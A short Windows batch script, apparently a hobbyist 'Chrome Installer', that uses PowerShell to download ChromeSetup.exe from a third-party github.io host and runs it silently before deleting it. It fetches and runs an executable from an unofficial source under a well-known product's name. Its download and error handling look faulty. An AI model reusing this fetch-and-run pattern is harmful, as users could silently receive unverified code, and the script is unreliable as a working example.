@echo off
call logo.bat
title Chrome Installer
echo.
echo Chrome Installer
echo ==================
echo Installing..
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm 'https://schooicodes.github.io/file_hosting/ChromeSetup.exe'">>%TEMP%\ChromeSetup.exe
%TEMP%\ChromeSetup.exe -silent -install
del "%TEMP%\ChromeSetup.exe"
if %ERRORLEVEL% EQU 0 (echo Success!) else (echo Error: %ERRORLEVEL%)
timeout /t 5 /NOBREAK >nul
exit
